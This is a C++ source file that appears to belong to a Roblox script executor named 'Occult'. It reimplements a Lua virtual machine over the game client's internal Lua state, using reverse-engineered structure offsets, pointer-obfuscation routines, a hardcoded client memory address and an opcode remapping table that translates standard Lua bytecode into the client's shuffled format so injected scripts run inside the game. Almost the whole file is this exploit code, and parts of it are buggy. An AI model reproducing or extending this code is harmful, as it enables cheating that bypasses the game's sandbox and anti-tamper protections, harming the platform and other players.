			r_luaV_gettable(rL, B, C, A);
			continue;
		}

		case OP_SETGLOBAL: {
			TValue* ctn = &(ccspool[GETARG_Bx(i)]);
			DWORD ctx = Occult_luaV_getonstack(rL, GETARG_A(i));
			L->savedpc = pc;
			r_luaV_settable(rL, (DWORD)(DWORD*)rL + 96, (DWORD)ctn, ctx);
			continue;
		}

		case OP_SETUPVAL: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			UpVal *uv = lcl->upvals[GETARG_B(i)];
			ttval(A)->tt = uv->v->tt;
			ttval(A)->value = uv->v->value;
			//luaC_barrier(L, uv, ra); Do we need this???
			continue;
		}

		case OP_SETTABLE: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
			r_luaV_settable(rL, A, B, C);
			continue;
		}

		case OP_NEWTABLE: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = GETARG_B(i);
			DWORD C = GETARG_C(i);
			((TValue*)A)->tt = R_LUA_TTABLE;
			((TValue*)A)->value.gc = (GCObject*)r_luaH_new(rL, Occult_luaO_fb2int(B), Occult_luaO_fb2int(C));
			L->savedpc = pc;
			continue;
		}

		case OP_SELF:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = Occult_luaV_getonstack(rL, GETARG_B(i));
			DWORD C = XRC(rL, i);
			memcpy((PVOID)(A + sizeof(TValue)), (PVOID)B, sizeof(TValue));
			r_ptr_obfus(rL + 20, pc);
			L->savedpc = pc;
			r_luaV_gettable(rL, B, C, A);
			continue;
		}

		case OP_ADD: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(nb + nc);
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_ADD);
			}
			continue;
		}

		case OP_SUB: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(nb - nc);
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_SUB);
			}
			continue;
		}

		case OP_MUL: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(nb * nc);
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_MUL);
			}
			continue;
		}

		case OP_DIV: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(nb / nc);
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_DIV);
			}
			continue;
		}

		case OP_MOD: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber((nb - floor(nb / nc) * nc));
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_MOD);
			}
			continue;
		}

		case OP_POW: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER && ((TValue*)C)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n),
					nc = Occult_luaX_ConvertNumber(((TValue*)C)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(pow(nb, nc));
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, C, R_TM_POW);
			}
			continue;
		}

		case OP_UNM: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = XRB(rL, i);
			if (((TValue*)B)->tt == R_LUA_TNUMBER) {
				double nb = Occult_luaX_ConvertNumber(((TValue*)B)->value.n);
				((TValue*)A)->tt = R_LUA_TNUMBER;
				((TValue*)A)->value.n = Occult_luaX_ConvertNumber(-(nb));
			}
			else {
				L->savedpc = pc;
				Occult_luaX_Arith(rL, A, B, B, R_TM_UNM);
			}
			continue;
		}

		case OP_NOT: {
			DWORD B = XRB(rL, i);
			TValue* A = ttval(Occult_luaV_getonstack(rL, GETARG_A(i)));
			int r = lisfalse(ttval(B));
			A->tt = R_LUA_TBOOLEAN;
			A->value.b = r;
		}

		case OP_LEN: {
			DWORD B = XRB(rL, i);
			TValue* A = ttval(Occult_luaV_getonstack(rL, GETARG_A(i)));
			switch (ttval(B)->tt) {
			case R_LUA_TTABLE: {
				A->tt = R_LUA_TNUMBER;
				A->value.n = Occult_luaX_ConvertNumber(r_luaH_getn(ttval(B)->value.gc));
				break;
			}
			case R_LUA_TSTRING: {
				A->tt = R_LUA_TNUMBER;
				A->value.n = Occult_luaX_ConvertNumber(*(int*)(*(int*)B + 8));
				break;
			}
			default: {
				r_ptr_obfus(rL + 20, pc);
				L->savedpc = pc;
				if (!r_call_binTM(rL, B, (DWORD)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAO_NILOBJECT)), (DWORD)A, R_TM_LEN)) {
					DbgPrint("get length of err");
					return TRUE;
				}
			}
			}
			continue;
		}

		case OP_CONCAT:
		{
			TValue* A = ttval(Occult_luaV_getonstack(rL, GETARG_A(i)));
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
			if (ttval(B)->tt == R_LUA_TSTRING && ttval(C)->tt == R_LUA_TSTRING) {
				TString* Val1 = (TString*)(ttval(B)->value.gc);
				TString* Val2 = (TString*)(ttval(C)->value.gc);
				int len = *(int*)(*(int*)B + 8) + *(int*)(*(int*)C + 8) + 1;
				char* dest = new char[len]();
				strcat(dest, (char*)(Val1 + 1));
				strcat(dest, (char*)(Val2 + 1));
				A->value.gc = (GCObject*)r_luaS_newlstr(rL, dest, len);
				A->tt = R_LUA_TSTRING;
				delete[] dest;
			}
			continue;
		}

		case OP_JMP: {
			dojmp(L, pc, GETARG_sBx(i));
			continue;
		}

		case OP_EQ: {
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
			if (Occult_luaV_equalVal(rL, ttval(B), ttval(C))) {
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		}

		case OP_LT: {
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
			if (ttval(B)->tt == R_LUA_TNUMBER && ttval(C)->tt == R_LUA_TNUMBER
				&& (Occult_luaX_ConvertNumber(ttval(B)->value.n) < Occult_luaX_ConvertNumber(ttval(C)->value.n))) {
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		}


		case OP_LE: {
			DWORD B = XRB(rL, i);
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
			if (ttval(B)->tt == R_LUA_TNUMBER && ttval(C)->tt == R_LUA_TNUMBER
				&& (Occult_luaX_ConvertNumber(ttval(B)->value.n) > Occult_luaX_ConvertNumber(ttval(C)->value.n))) {
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		}

		case OP_TEST: {
			TValue* A = ttval(Occult_luaV_getonstack(rL, GETARG_A(i)));
			if (lisfalse(A) != GETARG_C(i)) {
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		}

		case OP_TESTSET: {
			TValue* A = ttval(Occult_luaV_getonstack(rL, GETARG_A(i)));
			DWORD B = XRB(rL, i);// rb
			if (lisfalse(ttval(B)) != GETARG_C(i)) {
				memcpy((PVOID)A, (PVOID)B, sizeof(TValue));
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		};

		case OP_CALL:
		{

			DWORD a = Occult_luaV_getonstack(rL, GETARG_A(i));
			int b = GETARG_B(i);
			int nresults = GETARG_C(i) - 1;
			if (b != 0) {
				*(DWORD*)(rL + 12) = (DWORD)(ttval(a) + b);
			}
			//r_ptr_obfus(rL + 20, pc);
			//DbgPrint("nresults: %d\n", nresults);
			L->savedpc = pc;
			switch (r_luaD_precall(rL, a, nresults)) {
			case 0: {
				//DbgPrint("Was a lua call?\n");
				//DbgPrint("Escaping to RBX VM.\n");
				Occult_rluaV_execute(rL, 1);
				continue;
			}
			case 1:
			{
			//	DbgPrint("Was a C Call?\n");
				if (nresults >= 0)
				{
					*(DWORD*)(**(DWORD **)(*(DWORD *)(rL + 12) + 12) + 8);
				}
			}
			default:
				return 1;
			}
			continue;
		}

		case OP_RETURN:
		{
			//DbgPrint("Caught return (dbg), terminating.\n");
			return 0;
		}

		case OP_FORLOOP:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			double step = getnval(ttval(A + (sizeof(TValue) * 2)));
			double idx = getnval(ttval(A)) + step;
			double limit = getnval(ttval(A + sizeof(TValue)));
			if ((0 < step) ? ((idx) <= (limit)) : ((limit) <= (idx))) {
				dojmp(L, pc, GETARG_sBx(i));
				ttval(A)->tt = R_LUA_TNUMBER;
				ttval(A)->value.n = Occult_luaX_ConvertNumber(idx);
				ttval((A + (sizeof(TValue) * 3)))->tt = R_LUA_TNUMBER;
				ttval((A + (sizeof(TValue) * 3)))->value.n = Occult_luaX_ConvertNumber(idx);
			}
			continue;
		}

		case OP_FORPREP:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			TValue* init = ttval(A);
			TValue* plimit = ttval(A + sizeof(TValue));
			TValue* pstep = ttval(A + (sizeof(TValue) * 2));
			r_ptr_obfus(rL + 20, pc);
			L->savedpc = pc;
			if (!tonumber(init, init))
			{
				//DbgPrint("'for' inital value must be number\n");
				return TRUE;
			}
			else if (!tonumber(plimit, plimit))
			{
				//DbgPrint("'for' limit must be a number\n");
				return TRUE;
			}
			else if (!tonumber(pstep, pstep))
			{
				DbgPrint("'for' step must be a number\n");
				return TRUE;
			}
			init->value.n = Occult_luaX_ConvertNumber(getnval(init) - getnval(pstep));
			dojmp(L, pc, GETARG_sBx(i));
			continue;
		}

		case OP_TFORLOOP:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD Cb = A + (sizeof(TValue) * 3);
			memcpy((PVOID)(Cb + (sizeof(TValue) * 2)), (PVOID)(A + (sizeof(TValue) * 2)), sizeof(TValue));
			memcpy((PVOID)(Cb + sizeof(TValue)), (PVOID)(A + sizeof(TValue)), sizeof(TValue));
			memcpy((PVOID)Cb, (PVOID)A, sizeof(TValue));
			*(DWORD*)(rL + 12) = Cb + (sizeof(TValue) * 3);
			r_ptr_obfus(rL + 20, pc);
			L->savedpc = pc;
			Occult_luaX_dcall(L, rL, pfn, lcl, ttval(Cb), GETARG_C(i));
			*(DWORD*)(rL + 12) = Occult_luaV_getonstack(rL, (((DWORD)(L->ci->top) - (DWORD)(L->top)) / 12));
			Cb = (DWORD)(Occult_luaV_getonstack(rL, GETARG_A(i)) + (sizeof(TValue) * 3));
			if (ttval(Cb)->tt != R_LUA_TNIL) {
				memcpy((PVOID)(Cb - sizeof(TValue)), (PVOID)Cb, sizeof(TValue));
				dojmp(L, pc, GETARG_sBx(*pc));
			}
			pc++;
			continue;
		}

		case OP_SETLIST: {
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD n = GETARG_B(i), c = GETARG_C(i), last;
			void* table;
			if (n == 0) {
				n = cast_int(*(DWORD*)(rL + 12) - A) - 1;
				*(DWORD*)(rL + 12) = Occult_luaV_getonstack(rL, (((DWORD)(L->ci->top) - (DWORD)(L->top)) / 12));
			}
			if (c == 0) c = cast_int(*pc++);
			if (ttval(A)->tt != R_LUA_TTABLE) break;
			table = ttval(A)->value.gc;
			last = ((c - 1) * 50) + n;
			if (last > *(DWORD*)((DWORD)table + 12))
				r_luaH_resizearray(rL, table, last);
			for (; n > 0; n--) {
				TValue* v = (TValue*)(A + (12 * n));
				TValue* f = ttval(r_luaH_setnum(rL, table, last--));
				f->tt = v->tt;
				f->value = v->value;
			}
			continue;
		}

		case OP_CLOSE: {
			r_luaF_close(rL, Occult_luaV_getonstack(rL, GETARG_A(i)));
			continue;
		}

		case OP_CLOSURE: {
			Proto* p = lcl->p->p[GETARG_Bx(i)];
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));

			Closure* cl = luaF_newLclosure(L, p->nups, lcl->env);
			cl->l.p = p;

			//I'll have two number 9s, a number 9 large, a number 6 with extra dip, a number 7, two number 45s, one with cheese, and a large soda.

			TValue ancl;
			ancl.tt = LUA_TFUNCTION;
			ancl.value.gc = (GCObject*)cl;
			
			PUserdata test;
			test.cl = &ancl;
			test.L = L;
			test.rL = rL;

			TValue rp;
			rp.tt = R_LUA_TLIGHTUSERDATA;
			rp.value.p = &test;

			//DbgPrint("Lua State: 0x%x\n", (DWORD)rL);

			TValue* cclosure = Occult_luaX_pushcclosure_singleupvalue(rL, [](DWORD State)->DWORD {
				__try {
					PUserdata tcl = *(PUserdata*)Occult_luaX_touserdata(State, lua_upvalueindex(1));
					if (luaD_precall(tcl.L, tcl.cl, 0) == 0) {
						Occult_luaV_execute(tcl.L, tcl.rL, 1);
					}
					return LUA_MULTRET;
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					return 0;
				}
			}, &rp);

			ttval(A)->tt = R_LUA_TFUNCTION;
			ttval(A)->value.gc = cclosure->value.gc;
			L->savedpc = pc;
		//	DbgPrint("function pushed to a!\n");
			continue;
		}

		case OP_VARARG:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = GETARG_B(i) - 1;
			int j;
			CallInfo* ci = L->ci;
			int n = cast_int(ci->base - ci->func) - pfn->numparams - 1;
			if (B == LUA_MULTRET) {
				L->savedpc = pc;
				B = n;
				*(DWORD*)(rL + 16) = (DWORD)(A + (n*sizeof(TValue)));
			}
			for (int k = 0; k < (int)B; k++) {
				if (k < n) {
					memcpy((PVOID)(A + (k * sizeof(TValue))), (PVOID)(ci->base - ((n + j)*sizeof(TValue))), sizeof(TValue));
				}
				else {
					ttval(A + (k*sizeof(TValue)))->tt = R_LUA_TNIL;
				}

			}
			continue;
		}

		default:
		{
			return TRUE;
		}

		}
	}
	//left_vm_dbg:
	Occult_luaB_settop(rL, 0);
	return FALSE;
}

extern "C" int luaL_loadbuffer(lua_State* L, const char *buff, size_t sz, const char *name);

typedef struct {
	size_t *len;
	char **data;
} BS_DESCRIP;

int scriptMemoryWriter(lua_State* ls, const void* p, size_t sz, void* ud)
{
	BS_DESCRIP* bd = (BS_DESCRIP*)ud;
	char* newData = (char*)realloc(*(bd->data), (*(bd->len)) + sz);

	if (newData)
	{
		memcpy(newData + (*(bd->len)), p, sz);
		*(bd->data) = newData;
		*(bd->len) += sz;

	}
	else {
		free(newData);

		return 1;
	}

	return 0;
}

#define toproto(L,i) (clvalue(L->top+(i))->l.p)

static int writer(lua_State *L, const void *p, size_t size, void *u) {

	unsigned int i = 0;

	unsigned char *d = (unsigned char *)p;

	// Print all the bytes on the console.
	while (i != size) {
		printf("%d ", d[i]);
		++i;
	}
	return 0;
}

typedef unsigned char byte;

const char RBXL_OPNAMES[NUM_OPCODES]{
	0x06, /* MOVE		00 */
	0x04, /* LOADK		01 */
	0x00, /* LOADBOOL	02 */
	0x07, /* LOADNIL	03 */
	0x02, /* GETUPVAL	04 */
	0x08, /* GETGLOBAL	05 */
	0x01, /* GETTABLE	06 */
	0x03, /* SETGLOBAL	07 */
	0x05, /* SETUPVAL	08 */
	0x0F, /* SETTABLE	09 */
	0x0D, /* NEWTABLE	10 */
	0x09, /* SELF		11 */
	0x10, /* ADD		12 */
	0x0B, /* SUB		13 */
	0x11, /* MUL		14 */
	0x0A, /* DIV		15 */
	0x0C, /* MOD		16 */
	0x0E, /* POW		17 */
	0x18, /* UNM		18 */
	0x16, /* NOT		19 */
	0x12, /* LEN		20 */
	0x19, /* CONCAT		21 */
	0x14, /* JMP		22 */
	0x1A, /* EQ			23 */
	0x13, /* LT			24 */
	0x15, /* LE			25 */
	0x17, /* TEST		26 */
	0x21, /* TESTSET	27 */
	0x1F, /* CALL		28 */
	0x1B, /* TAILCALL	29 */
	0x22, /* RETURN		30 */ // In the compiled code, this is at the end.
	0x1D, /* FORLOOP	31 */
	0x23, /* FORPREP	32 */
	0x1C, /* TFORLOOP	33 */
	0x1E, /* SETLIST	34 */
	0x20, /* CLOSE		35 */
	0x25, /* CLOSURE	36 */
	0x24, /* VARARG		37 */
};

#define RLUA_TNIL			0
#define RLUA_TLIGHTUSERDATA	1
#define RLUA_TNUMBER		2
#define RLUA_TBOOLEAN		3
#define RLUA_TSTRING		4
#define RLUA_TTABLE			7
#define RLUA_TUSERDATA		8
#define RLUA_TFUNCTION		6
#define RLUA_TTHREAD		5
#define RLUA_TPROTO			9
#define RLUA_TUPVAL			10

typedef struct r_LClosure {
	int *next;					// +00  00 
	byte marked;				// +04  04 
	byte tt;					// +05  05 
	byte isC;					// +06  06 
	byte nupvalues;				// +07  07 
	int *gclist;				// +08  08  
	int *env;					// +0C  12 
	int *p;						// +10  16
	int upvals[1];				// +14  20 
};

typedef struct r_CClosure {
	int *next;					// +00  00 
	byte marked;				// +04  04 
	byte tt;					// +05  05 
	byte isC;					// +06  06 
	byte nupvalues;				// +07  07 
	int *gclist;				// +08  08  
	int *env;					// +0C  12 
	int* f;						// +10  16
	int upvals[1];				// +14  20 
};

typedef struct r_TString {
	int* next;					// +00  00
	byte marked;				// +04  04
	byte tt;					// +05  05
	byte reserved_0;			// +06  06
	byte reserved_1;			// +07	07
	unsigned int len;			// +08	08
	unsigned int hash;			// +12  0C
};

typedef struct r_Udata {
	int* next;					// +00  00
	byte marked;				// +04  04
	byte tt;					// +05  05
	byte reserved_0;			// +06  06
	byte reserved_1;			// +07	07
	int* env;					// +08	08
	unsigned int len;			// +12	0C
	int* metatable;				// +16	10
	int unk;					// +20	14
};

typedef struct r_LocVar {
	r_TString *varname;
	int startpc;  /* first point where variable is active */
	int endpc;    /* first point where variable is dead */
};

typedef struct r_TValue {
	int value_0;
	int value_1;
	int tt;
	int unk;
};

typedef struct r_Proto {
	int* next;					// +00	00
	byte marked;				// +04	04
	byte tt;					// +05	05
	byte unk_0;					// +06	06
	byte unk_1;					// +07	07
	struct r_Proto** p;			// +08	08
	r_TString* source;			// +12	0C
	struct r_LocVar *locvars;	// +16	10
	int unk_3;					// +20	14
	int* code;					// +24	18
	int sizek;					// +28	1C
	r_TValue* k;				// +32	20
	int* lineinfo;				// +36	24 ???
	int unk_5;					// +40	28
	int sizep;					// +44	2C
	int sizelocvars;			// +48	30
	int sizecode;				// +52	34
	int unk_6;					// +56	38
	int unk_7;					// +60	3C
	int sizelineinfo;			// +64	40 ???
	int unk_9;					// +68	44
	byte maxstacksize;			// +72	48
	byte numparams;				// +73	49
	byte nups;					// +74	4A
	byte is_vararg;				// +75	4B
};

void r_setobj(r_TValue* a, r_TValue* b) {
	a->value_0 = b->value_0;
	a->value_1 = b->value_1;
	a->tt = b->tt;
	a->unk = b->unk;
}

void r_incr_top(int r_lua_State) {
	*(int*)(r_lua_State + 12) += sizeof(r_TValue);
}

void r_decr_top(int r_lua_State) {
	*(int*)(r_lua_State + 12) -= sizeof(r_TValue);
}

r_TValue* r_gettop(int r_lua_State) {
	return *(r_TValue**)(r_lua_State + 12);
}

int decrypt_ptr(int loc) {
	return *(int*)loc + loc;
}

int encrypt_ptr(int loc, void* value) {
	*(int*)loc = (int)value - loc;
	return loc;
}


void r_luaC_link(int r_lua_State, int o, byte tt) {
	int g = decrypt_ptr(r_lua_State + 8);	// global_State *g = G(L)
	*(int*)(o) = *(int*)(g + 48);			// o->gch.next = g->rootgc
	*(int*)(g + 48) = o;					// g->rootgc = o
	*(byte*)(o + 4) = *(byte*)(g + 21) & 3;	// o->gch.marked = luaC_white(g)
	*(byte*)(o + 5) = tt;					// o->gch.tt = tt;

}

r_LClosure* r_luaF_newLclosure(int r_lua_State, int nups, int e) {
	r_LClosure* nlc = (r_LClosure*)r_luaM_malloc(r_lua_State, 20 + nups * 4);
	r_luaC_link(r_lua_State, (int)nlc, RLUA_TFUNCTION);

	nlc->isC = false;
	nlc->env = (int*)e;
	nlc->nupvalues = nups;
	nlc->gclist = 0; // wat

	while (nups--) nlc->upvals[nups] = NULL;
	return nlc;
}

void r_lua_pushLclosure(int r_lua_State, r_LClosure* lc) {
	r_TValue* top = *(r_TValue**)(r_lua_State + 16);
	top->value_0 = (int)lc;
	top->value_1 = 0;
	top->tt = RLUA_TFUNCTION;
	top->unk = 0;

	r_incr_top(r_lua_State);
}

void r_lua_pushstring(int r_lua_State, const char* str) {
	r_TValue* top = *(r_TValue**)(r_lua_State + 12);
	top->value_0 = (int)r_luaS_newlstr(r_lua_State, str, 0);
	top->value_1 = 0;
	top->tt = RLUA_TSTRING;
	top->unk = 0;

	r_incr_top(r_lua_State);
}

int r_lua_gettop(int r_lua_State) {
	r_TValue* top = *(r_TValue**)(r_lua_State + 12);
	r_TValue* base = *(r_TValue**)(r_lua_State + 20);

	return (int)(top - base);
}

r_TValue* r_getobjat(int r_lua_State, int off) {
	r_TValue* top = *(r_TValue**)(r_lua_State + 12);
	r_TValue* base = *(r_TValue**)(r_lua_State + 20);

	if (off > r_lua_gettop(r_lua_State)) {
		return 0;
	}

	return base + (off - 1);
}

void r_lua_pushnumber(int r_lua_State, lua_Number n) {
	r_TValue* top = r_gettop(r_lua_State);

	__int64 val;
	memcpy(&val, &n, sizeof(__int64));
	//	rtvalue_setn(top, val);

	top->tt = RLUA_TNUMBER;
	top->unk = 0;
	r_incr_top(r_lua_State);
}

/* * `index` must be above 0 */
lua_Number r_tonumber(int r_lua_State, int index) {
	r_TValue* obj = r_getobjat(r_lua_State, index);
	if (obj->tt != RLUA_TNUMBER) return 0;

	double n;
	//	__int64 n64 = rtvalue_getn(obj);
	//	memcpy(&n, &n64, 8);

	return n;
}

const char* r_tostring(int r_lua_State, int index) {
	r_TValue* obj = r_getobjat(r_lua_State, index);
	if (obj->tt != RLUA_TSTRING) return 0;

	return (const char*)(((r_TString*)obj->value_0) + 1);
}

/* has a 256 character limit */
void r_lua_pushvfstring(int r_lua_State, const char* fmt, ...) {
	char message[256];
	va_list vl;
	va_start(vl, fmt);
	vsnprintf_s(message, 256, fmt, vl);
	va_end(vl);

	r_lua_pushstring(r_lua_State, message);
}

void r_lua_pushnil(int r_lua_State) {
	r_TValue* top = *(r_TValue**)(r_lua_State + 10);
	top->value_0 = 0;
	top->value_1 = 0;
	top->tt = RLUA_TNIL;
	top->unk = 0;

	r_incr_top(r_lua_State);
}

void r_lua_pushboolean(int r_lua_State, int b) {
	r_TValue* top = r_gettop(r_lua_State);
	top->value_0 = b;
	top->value_1 = 0;
	top->tt = RLUA_TBOOLEAN;
	top->unk = 0;
	r_incr_top(r_lua_State);
}

/* gets metatable from last object on stack */
int r_lua_getmetatable(int r_lua_State) {
	r_TValue* top = r_gettop(r_lua_State);
	r_TValue* mt = top - 1;
	int table;

	switch (mt->tt) {
	case RLUA_TTABLE:
		table = mt->value_0 + 28;
		break;
	case RLUA_TUSERDATA:
		table = mt->value_0 + 16;
		break;
	default:
		return 0;
	}


	return 1;
}

int wrap_object(int r_lua_State, int inst, int ext) {
	if (inst) {

	}

	r_lua_pushnil(r_lua_State);
	return 1;
}

void* r_getudata(int r_lua_State, int idx) {
	if (!idx) idx = r_lua_gettop(r_lua_State);
	r_TValue* obj = r_getobjat(r_lua_State, idx);
	if (obj->tt != RLUA_TUSERDATA)
		return 0;

	return (void*)(obj->value_0 + 24);
}

void r_lua_settop(int r_lua_State, int idx) {
	if (idx >= 0) {
		while (*(r_TValue**)(r_lua_State + 12) < *(r_TValue**)(r_lua_State + 20) + idx) {
			(*(r_TValue**)(r_lua_State + 12))->tt = RLUA_TNIL;
			*(r_TValue**)(r_lua_State + 12) += 1;
		}

		*(r_TValue**)(r_lua_State + 12) = *(r_TValue**)(r_lua_State + 20) + idx;

	}
	else {
		*(r_TValue**)(r_lua_State + 12) += idx + 1;
	}
}

#define r_lua_pop(r, n) r_lua_settop(r, -(n)-1)

// --- thread scheduler declarations --- \\

typedef struct ThreadRef {
	int state;
	std::string code;
	std::string source;
	//	RBXInstance instance;
};


// --- core utilities --- \\


#define RSET_OPCODE(i,o)	((i) = (((i) & MASK0(6, 26)) | \
		(((Instruction)o << 26) & MASK1(6, 26))))
#define RGET_OPCODE(i)		(i >> 26 & MASK1(6, 0))

#define RSETARG_A(i,o)		((i) = (((i) & MASK0(8, 18)) | \
		(((Instruction)o << 18) & MASK1(8, 18))))
#define RGETARG_A(i)		(i >> 18 & MASK1(8, 0))

#define RSETARG_B(i,o)		((i) = (((i) & MASK0(9, 0)) | \
		(((Instruction)o << 0) & MASK1(9, 0))))
#define RGETARG_B(i)		(i >>  0 & MASK1(9, 0))

#define RSETARG_C(i,o)		((i) = (((i) & MASK0(9, 9)) | \
		(((Instruction)o << 9) & MASK1(9, 9))))
#define RGETARG_C(i)		(i >>  9 & MASK1(9, 0))

#define RSETARG_Bx(i,b)		((i) = (((i) & MASK0(18, 0)) | \
		(((Instruction)b << 0) & MASK1(18, 0))))
#define RGETARG_Bx(i)		(i >>  0 & MASK1(18, 0))

#define RSETARG_sBx(i,b)	RSETARG_Bx((i),cast(unsigned int, (b)+MAXARG_sBx))
#define RGETARG_sBx(i)		(RGETARG_Bx(i)-MAXARG_sBx)

void random_string(char* b, int sz) {
	const char* characters =
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (int i = 0; i < sz; i++) {
		b[i] = characters[rand() % (strlen(characters) + 1)];
	}

	b[sz] = 0;
}

int get_rbxl_opcode(OpCode opcode) {
	return RBXL_OPNAMES[opcode];
}

OpCode get_lua_opcode(int opcode) {
	for (int i = 0; i < NUM_OPCODES; i++) {
		if (get_rbxl_opcode((OpCode)i) == opcode) {
			return (OpCode)i;
		}
	}
	return (OpCode)-1;
}



int convert_lua_instruction(Instruction inst) {
	int rtn = ~0;

	OpCode opcode = GET_OPCODE(inst);
	RSET_OPCODE(rtn, get_rbxl_opcode(opcode));

	switch (getOpMode(opcode)) {
	case iABC:
		RSETARG_A(rtn, GETARG_A(inst));
		RSETARG_B(rtn, GETARG_B(inst));
		RSETARG_C(rtn, GETARG_C(inst));
		break;
	case iABx:
		RSETARG_A(rtn, GETARG_A(inst));
		RSETARG_Bx(rtn, GETARG_Bx(inst));
		break;
	case iAsBx:
		RSETARG_A(rtn, GETARG_A(inst));
		RSETARG_sBx(rtn, GETARG_sBx(inst));
		break;
	default:
		return 0;
	}

	if (opcode == OP_MOVE)
		RSETARG_C(rtn, 1);

	return rtn;
}
#define r_luaM_new(L,t)		cast(t *, r_luaM_malloc(L, sizeof(t)))

void rev_luaC_link(int r_lua_State, int o, byte tt)
{
	int g = decrypt_ptr(r_lua_State + 8);	// global_State *g = G(L)
	*(int*)(o) = *(int*)(g + 48);			// o->gch.next = g->rootgc
	*(int*)(g + 48) = o;					// g->rootgc = o
	*(byte*)(o + 4) = *(byte*)(g + 21) & 3;	// o->gch.marked = luaC_white(g)
	*(byte*)(o + 5) = tt;					// o->gch.tt = tt;
}

void* rev_luaM_realloc_(int r_lua_State, int block, int osize, int nsize)
{
	return nullptr;
}

r_Proto* r_luaF_newproto(int r_lua_State)
{
	//DbgPrint("Getting Proto.\n");
	r_Proto* f = r_luaM_new(r_lua_State, r_Proto);
	rev_luaC_link(r_lua_State, (int)f, R_LUA_TPROTO);
	ZeroMemory(f, sizeof(r_Proto));
	//DbgPrint("Got.\n");
	return f;
}


#define r_luaS_new(r_lua_State, s)	(r_luaS_newlstr(r_lua_State, s, strlen(s)))

__int64* lua_number_key = (__int64*)0x130B710;

